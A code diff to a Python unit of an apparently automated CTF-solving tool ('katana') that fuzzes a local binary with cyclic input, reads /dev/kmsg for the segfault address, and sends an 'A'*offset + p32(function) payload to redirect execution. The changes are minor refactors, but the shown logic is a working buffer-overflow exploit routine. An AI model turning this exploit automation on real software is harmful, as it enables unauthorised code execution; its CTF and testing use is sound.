@@ -7,7 +7,7 @@ class Unit(units.pwnage.BasicBufferOverflowUnit):
 
 	# read /dev/kmsg to find the address that the given pid segfault'd
 	def get_segfault_address(self, pid):
-		token = '{0}[{1}]: segfault'.format(os.path.basename(self.target), pid)
+		token = '{0}[{1}]: segfault'.format(os.path.basename(self.target.path), pid)
 		fd = os.open('/dev/kmsg', os.O_RDONLY | os.O_NONBLOCK)
 		with os.fdopen(fd) as kmsg:
 			for line in kmsg:
@@ -22,12 +22,12 @@ class Unit(units.pwnage.BasicBufferOverflowUnit):
 		for size in range(16,2048,32):
 			try:
 				# Create the process
-				p = subprocess.Popen([self.target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+				p = subprocess.Popen([self.target.path], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
 						stderr=subprocess.PIPE, text=True)
 
 				# Grab the pid
 				pid = p.pid
-
+				
 				# Send the input
 				(stdout, stderr) = p.communicate(cyclic(size), timeout=katana.config['timeout'])
 
@@ -50,13 +50,13 @@ class Unit(units.pwnage.BasicBufferOverflowUnit):
 				p.communicate()
 				continue
 
-		raise units.NotApplicable()
+		raise units.NotApplicable("no buffer overflow found")
 
 
 	def evaluate(self, katana, function):
 
 		payload = b'A'*self.offset + p32(function)
-		p = subprocess.Popen([self.target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+		p = subprocess.Popen([self.target.path], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
 				stderr=subprocess.PIPE)
 
 		try:
@@ -80,7 +80,7 @@ class Unit(units.pwnage.BasicBufferOverflowUnit):
 		katana.recurse(self, stdout)
 		katana.recurse(self, stderr)
 		katana.add_results(self, {
-			'cmdline': self.target,
+			'cmdline': self.target.path,
 			'stdin': ''.join([ '\\x{0:02x}'.format(c) if c < 32 or c >= 127 else chr(c) for c in payload]),
 			'stdout': stdout,
 			'stderr': stderr,
